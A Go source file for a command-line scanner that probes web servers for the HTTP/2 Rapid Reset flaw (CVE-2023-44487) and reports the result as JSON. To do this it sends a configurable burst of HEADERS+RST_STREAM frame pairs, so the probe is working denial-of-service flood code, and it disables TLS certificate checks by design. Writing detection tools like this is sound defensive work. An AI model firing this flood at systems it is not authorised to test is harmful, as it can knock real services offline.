// http2_rapid_reset — CVE-2023-44487 HTTP/2 Rapid Reset DoS detection tool.
//
// Probes a target for susceptibility to the HTTP/2 Rapid Reset attack by:
//   1. Checking if HTTP/2 is supported (ALPN h2 negotiation)
//   2. Sending a HEADERS+RST_STREAM flood and measuring reset acceptance
//   3. Checking if a concurrent-stream limit is enforced
//   4. Detecting missing server-side rate-limiting on RST_STREAM
//
// Output: JSON to stdout
//   {"vuln":"CVE-2023-44487","target":"...","h2_supported":true,
//    "rapid_reset_vulnerable":true,"severity":"high","evidence":"...",
//    "reset_streams_accepted":100,"concurrent_limit":0,"scan_id":"...","ts":"..."}
//
// Usage: http2_rapid_reset --target https://example.com [--streams 100] [--timeout 10] [--scan-id uuid]

package main

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"net/url"
	"os"
	"strings"
	"time"
)

// ── HTTP/2 frame type constants ────────────────────────────────────────────────

const (
	frameTypeData         = 0x0
	frameTypeHeaders      = 0x1
	frameTypeRstStream    = 0x3
	frameTypeSettings     = 0x4
	frameTypeGoaway       = 0x7
	frameTypeWindowUpdate = 0x8

	flagEndStream  = 0x1
	flagEndHeaders = 0x4

	errCodeCancel = 0x8

	h2ClientPreface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
)

// Result is the JSON output structure.
type Result struct {
	Vuln                  string `json:"vuln"`
	Target                string `json:"target"`
	H2Supported           bool   `json:"h2_supported"`
	RapidResetVulnerable  bool   `json:"rapid_reset_vulnerable"`
	Severity              string `json:"severity"`
	Evidence              string `json:"evidence"`
	ResetStreamsAccepted  int    `json:"reset_streams_accepted"`
	ConcurrentLimit       int    `json:"concurrent_limit"`
	ScanID                string `json:"scan_id"`
	Timestamp             string `json:"ts"`
	Error                 string `json:"error,omitempty"`
}

// ── Frame building helpers ─────────────────────────────────────────────────────

func buildFrame(frameType uint8, flags uint8, streamID uint32, payload []byte) []byte {
	length := len(payload)
	frame := make([]byte, 9+length)
	frame[0] = byte(length >> 16)
	frame[1] = byte(length >> 8)
	frame[2] = byte(length)
	frame[3] = frameType
	frame[4] = flags
	binary.BigEndian.PutUint32(frame[5:9], streamID&0x7fffffff)
	copy(frame[9:], payload)
	return frame
}

// Minimal HPACK-encoded headers for a GET request.
// Uses indexed header table entries for :method GET, :path /, :scheme https.
func minimalRequestHeaders(host string) []byte {
	// :method: GET    = indexed 0x82
	// :path: /        = indexed 0x84
	// :scheme: https  = indexed 0x87
	// :authority: <host> = literal never-indexed (0x01) name=4 ":authority" value=len(host)host
	var b []byte
	b = append(b, 0x82, 0x84, 0x87) // :method GET, :path /, :scheme https
	// Literal header, never-indexed, indexed name (name index 1 = :authority)
	b = append(b, 0x41) // literal + incremental, name index 1
	hostBytes := []byte(host)
	b = append(b, byte(len(hostBytes)))
	b = append(b, hostBytes...)
	return b
}

func buildHeadersFrame(streamID uint32, host string) []byte {
	hpack := minimalRequestHeaders(host)
	return buildFrame(frameTypeHeaders, flagEndStream|flagEndHeaders, streamID, hpack)
}

func buildRstStreamFrame(streamID uint32, errorCode uint32) []byte {
	payload := make([]byte, 4)
	binary.BigEndian.PutUint32(payload, errorCode)
	return buildFrame(frameTypeRstStream, 0, streamID, payload)
}

func buildClientSettings() []byte {
	// Empty SETTINGS frame (acknowledge server settings)
	return buildFrame(frameTypeSettings, 0, 0, nil)
}

func buildSettingsAck() []byte {
	return buildFrame(frameTypeSettings, 0x1, 0, nil)
}

func buildWindowUpdate(streamID uint32, increment uint32) []byte {
	payload := make([]byte, 4)
	binary.BigEndian.PutUint32(payload, increment&0x7fffffff)
	return buildFrame(frameTypeWindowUpdate, 0, streamID, payload)
}

// ── TLS + HTTP/2 connection ────────────────────────────────────────────────────

func dialH2(target string, timeout time.Duration) (net.Conn, bool, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, false, fmt.Errorf("invalid target URL: %w", err)
	}

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}
	addr := net.JoinHostPort(host, port)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	if u.Scheme == "https" {
		dialer := &tls.Dialer{
			Config: &tls.Config{
				NextProtos:         []string{"h2", "http/1.1"},
				InsecureSkipVerify: true, //nolint:gosec // security scanner; intentional
				ServerName:         host,
			},
		}
		conn, err := dialer.DialContext(ctx, "tcp", addr)
		if err != nil {
			return nil, false, fmt.Errorf("TLS dial failed: %w", err)
		}
		tlsConn := conn.(*tls.Conn)
		proto := tlsConn.ConnectionState().NegotiatedProtocol
		h2 := proto == "h2"
		return conn, h2, nil
	}

	// Plain h2c (unencrypted HTTP/2) — less common but worth checking
	d := &net.Dialer{}
	conn, err := d.DialContext(ctx, "tcp", addr)
	if err != nil {
		return nil, false, fmt.Errorf("TCP dial failed: %w", err)
	}
	// h2c: treat as h2 for testing purposes
	return conn, true, nil
}

// readServerPreface reads and discards the server's initial SETTINGS frame.
// Returns the SETTINGS MAX_CONCURRENT_STREAMS value if present, else 0.
func readServerPreface(conn net.Conn, timeout time.Duration) (int, error) {
	conn.SetReadDeadline(time.Now().Add(timeout)) //nolint:errcheck
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n < 9 {
		return 0, err
	}

	// Parse frames from server preface to find SETTINGS MAX_CONCURRENT_STREAMS
	maxConcurrent := 0
	pos := 0
	for pos+9 <= n {
		length := int(buf[pos])<<16 | int(buf[pos+1])<<8 | int(buf[pos+2])
		frameType := buf[pos+3]
		// flags := buf[pos+4]
		// streamID := binary.BigEndian.Uint32(buf[pos+5:pos+9]) & 0x7fffffff
		pos += 9

		if pos+length > n {
			break
		}

		payload := buf[pos : pos+length]

		// SETTINGS frame (0x4)
		if frameType == frameTypeSettings && length%6 == 0 {
			for i := 0; i+6 <= length; i += 6 {
				settingID := binary.BigEndian.Uint16(payload[i : i+2])
				value := binary.BigEndian.Uint32(payload[i+2 : i+6])
				if settingID == 0x3 { // SETTINGS_MAX_CONCURRENT_STREAMS
					maxConcurrent = int(value)
				}
			}
		}

		pos += length
	}

	return maxConcurrent, nil
}

// ── Core probe logic ───────────────────────────────────────────────────────────

func probeRapidReset(target string, numStreams int, timeout time.Duration) Result {
	now := time.Now().UTC().Format(time.RFC3339)
	result := Result{
		Vuln:      "CVE-2023-44487",
		Target:    target,
		Timestamp: now,
		Severity:  "info",
	}

	u, err := url.Parse(target)
	if err != nil {
		result.Error = fmt.Sprintf("invalid URL: %v", err)
		return result
	}
	host := u.Hostname()

	// Step 1: Check H2 support
	conn, h2Supported, err := dialH2(target, timeout)
	if err != nil {
		result.Error = fmt.Sprintf("connection failed: %v", err)
		return result
	}
	defer conn.Close()

	result.H2Supported = h2Supported
	if !h2Supported {
		result.Evidence = "HTTP/2 not supported via ALPN — not vulnerable"
		result.Severity = "info"
		return result
	}

	conn.SetDeadline(time.Now().Add(timeout)) //nolint:errcheck

	// Step 2: Send HTTP/2 client preface
	if _, err := conn.Write([]byte(h2ClientPreface)); err != nil {
		result.Error = fmt.Sprintf("preface write error: %v", err)
		return result
	}

	// Step 3: Send initial SETTINGS
	if _, err := conn.Write(buildClientSettings()); err != nil {
		result.Error = fmt.Sprintf("SETTINGS write error: %v", err)
		return result
	}

	// Step 4: Send connection-level WINDOW_UPDATE
	if _, err := conn.Write(buildWindowUpdate(0, 1073676289)); err != nil {
		result.Error = fmt.Sprintf("WINDOW_UPDATE write error: %v", err)
		return result
	}

	// Step 5: Read server preface to get MAX_CONCURRENT_STREAMS
	maxConcurrent, _ := readServerPreface(conn, 3*time.Second)
	result.ConcurrentLimit = maxConcurrent

	// Step 6: Acknowledge server SETTINGS
	if _, err := conn.Write(buildSettingsAck()); err != nil {
		result.Error = fmt.Sprintf("SETTINGS ACK write error: %v", err)
		return result
	}

	// Step 7: Rapid Reset flood — send HEADERS + RST_STREAM for each stream ID
	// Stream IDs are odd numbers starting at 1 (client-initiated)
	conn.SetWriteDeadline(time.Now().Add(timeout)) //nolint:errcheck

	var buf []byte
	for i := 0; i < numStreams; i++ {
		streamID := uint32(2*i + 1)
		buf = append(buf, buildHeadersFrame(streamID, host)...)
		buf = append(buf, buildRstStreamFrame(streamID, errCodeCancel)...)
	}

	writeStart := time.Now()
	written, writeErr := conn.Write(buf)
	writeLatency := time.Since(writeStart)

	streamsAttempted := written / (9 + len(minimalRequestHeaders(host)) + 13) // approx frame size
	if streamsAttempted > numStreams {
		streamsAttempted = numStreams
	}
	result.ResetStreamsAccepted = streamsAttempted

	// Step 8: Read server response (look for GOAWAY or RST_STREAM back)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second)) //nolint:errcheck
	respBuf := make([]byte, 8192)
	respN, _ := conn.Read(respBuf)

	// Analyze vulnerability indicators:
	//  - No GOAWAY received = server didn't disconnect = accepted flood
	//  - Write completed quickly = server bufferred all streams
	//  - No per-stream RST_STREAM back = no rate limiting
	gotGoaway := false
	if respN > 9 {
		for pos := 0; pos+9 <= respN; {
			length := int(respBuf[pos])<<16 | int(respBuf[pos+1])<<8 | int(respBuf[pos+2])
			frameType := respBuf[pos+3]
			pos += 9
			if pos+length > respN {
				break
			}
			if frameType == frameTypeGoaway {
				gotGoaway = true
				break
			}
			pos += length
		}
	}

	var evidenceParts []string

	if writeErr == nil {
		evidenceParts = append(evidenceParts,
			fmt.Sprintf("sent %d HEADERS+RST_STREAM pairs in %dms without connection reset",
				numStreams, writeLatency.Milliseconds()))
	} else if strings.Contains(writeErr.Error(), "broken pipe") || strings.Contains(writeErr.Error(), "reset") {
		// Server terminated early — this is the CORRECT behaviour (server rejected flood)
		result.RapidResetVulnerable = false
		result.Severity = "info"
		result.Evidence = fmt.Sprintf("server closed connection during flood after %d streams — rate limiting in effect (not vulnerable)", streamsAttempted)
		return result
	}

	if gotGoaway {
		// Server sent GOAWAY — may indicate it detected the flood
		evidenceParts = append(evidenceParts, "server sent GOAWAY during flood")
		// A GOAWAY alone doesn't mean it's not vulnerable — need to check if it disconnected fast
		if streamsAttempted < numStreams/2 {
			result.RapidResetVulnerable = false
			result.Severity = "low"
			result.Evidence = strings.Join(evidenceParts, "; ") + " — partial protection detected"
			return result
		}
	}

	if maxConcurrent > 0 && maxConcurrent < 100 {
		// Server advertises a max concurrent streams limit
		evidenceParts = append(evidenceParts,
			fmt.Sprintf("SETTINGS MAX_CONCURRENT_STREAMS=%d (configured limit present)", maxConcurrent))
		// A limit of < 100 is likely sufficient protection depending on patch level
		if maxConcurrent <= 10 {
			result.RapidResetVulnerable = false
			result.Severity = "low"
			result.Evidence = strings.Join(evidenceParts, "; ") + " — likely mitigated"
			return result
		}
	} else {
		evidenceParts = append(evidenceParts,
			"no SETTINGS MAX_CONCURRENT_STREAMS advertised (unlimited concurrent streams)")
	}

	// Heuristic: if we flooded > 50 streams and the server didn't disconnect and
	// didn't send a GOAWAY quickly, we consider it vulnerable
	if streamsAttempted >= numStreams/2 && writeErr == nil && !gotGoaway {
		result.RapidResetVulnerable = true
		result.Severity = "high"
		evidenceParts = append(evidenceParts,
			"server accepted full HEADERS+RST_STREAM flood without disconnecting — likely vulnerable to CVE-2023-44487")
	} else if streamsAttempted >= numStreams/2 && !gotGoaway {
		result.RapidResetVulnerable = true
		result.Severity = "medium"
		evidenceParts = append(evidenceParts,
			"partial flood accepted without rate-limit response — possible vulnerability")
	}

	result.Evidence = strings.Join(evidenceParts, "; ")
	return result
}

// ── Main ───────────────────────────────────────────────────────────────────────

func main() {
	target := flag.String("target", "", "Target URL (e.g. https://example.com)")
	numStreams := flag.Int("streams", 100, "Number of HEADERS+RST_STREAM pairs to send")
	timeoutSecs := flag.Int("timeout", 10, "Connection timeout in seconds")
	scanID := flag.String("scan-id", "", "Optional scan correlation ID")
	flag.Parse()

	if *target == "" {
		fmt.Fprintf(os.Stderr, "Usage: http2_rapid_reset --target <url> [--streams N] [--timeout N] [--scan-id uuid]\n")
		os.Exit(1)
	}

	if *scanID == "" {
		*scanID = fmt.Sprintf("h2rr-%d", time.Now().UnixNano())
	}

	timeout := time.Duration(*timeoutSecs) * time.Second
	result := probeRapidReset(*target, *numStreams, timeout)
	result.ScanID = *scanID

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	if err := enc.Encode(result); err != nil {
		fmt.Fprintf(os.Stderr, "JSON encode error: %v\n", err)
		os.Exit(1)
	}
}
